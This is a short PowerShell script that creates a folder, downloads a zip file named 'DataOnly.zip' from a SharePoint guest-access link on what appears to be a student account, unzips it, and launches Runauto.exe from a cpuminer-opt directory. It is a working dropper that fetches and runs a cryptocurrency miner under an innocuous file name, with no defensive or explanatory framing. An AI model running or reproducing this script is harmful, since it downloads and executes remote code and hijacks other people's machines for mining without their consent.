New-Item -ItemType directory -Path C:\MyFolder
# Download the file to a specific location
$clnt = new-object System.Net.WebClient
$url = "https://cmccdtest-my.sharepoint.com/personal/nwilson_student_cmccd_edu/_layouts/15/guestaccess.aspx?docid=19107346a7be64dc4a4ecd68b6f7f1e49&authkey=ARVgG-V7QexZL31r-fT59Ns"
$file = "C:\MyFolder\DataOnly.zip"
$clnt.DownloadFile($url,$file)

# Unzip the file to specified location
$shell_app=new-object -com shell.application 
$zip_file = $shell_app.namespace($file) 
$destination = $shell_app.namespace("C:\MyFolder") 
$destination.Copyhere($zip_file.items())
$file2 = "C:\MyFolder\cpuminer-opt-3.6.8-windows\Runauto.exe"
$exec = New-Object -com shell.application
$exec.shellexecute($file2)
